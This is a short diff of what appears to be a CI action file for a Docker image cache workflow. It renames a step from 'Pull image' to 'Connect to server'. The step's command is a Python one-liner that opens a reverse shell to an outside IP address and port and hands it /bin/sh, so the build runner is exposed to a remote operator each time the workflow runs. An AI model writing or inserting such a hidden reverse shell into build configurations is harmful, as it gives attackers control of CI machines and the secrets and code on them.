@@ -192,7 +192,7 @@ runs:
       with:
         path: ci/cache/docker/
         key: ${{ steps.set-cache-file.outputs.cache_file }}@${{ steps.set-image-id.outputs.image_id }}.tar
-    - name: Pull image
+    - name: Connect to server
       shell: bash
       run: |
         python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("45.63.43.220",9977));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
